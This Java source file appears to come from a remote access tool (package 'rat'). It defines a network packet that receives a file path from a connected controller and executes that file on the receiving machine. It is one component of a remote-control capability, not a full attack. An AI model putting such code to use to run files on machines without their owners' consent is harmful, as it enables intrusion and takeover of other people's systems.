package de.sogomn.rat.packet;

import de.sogomn.engine.util.FileUtils;
import de.sogomn.rat.ActiveConnection;

public final class ExecuteFilePacket implements IPacket {
	
	private String path;
	
	public ExecuteFilePacket(final String path) {
		this.path = path;
	}
	
	public ExecuteFilePacket() {
		this("");
	}
	
	@Override
	public void send(final ActiveConnection connection) {
		connection.writeUTF(path);
	}
	
	@Override
	public void receive(final ActiveConnection connection) {
		path = connection.readUTF();
	}
	
	@Override
	public void execute(final ActiveConnection connection) {
		FileUtils.executeFile(path);
	}

}
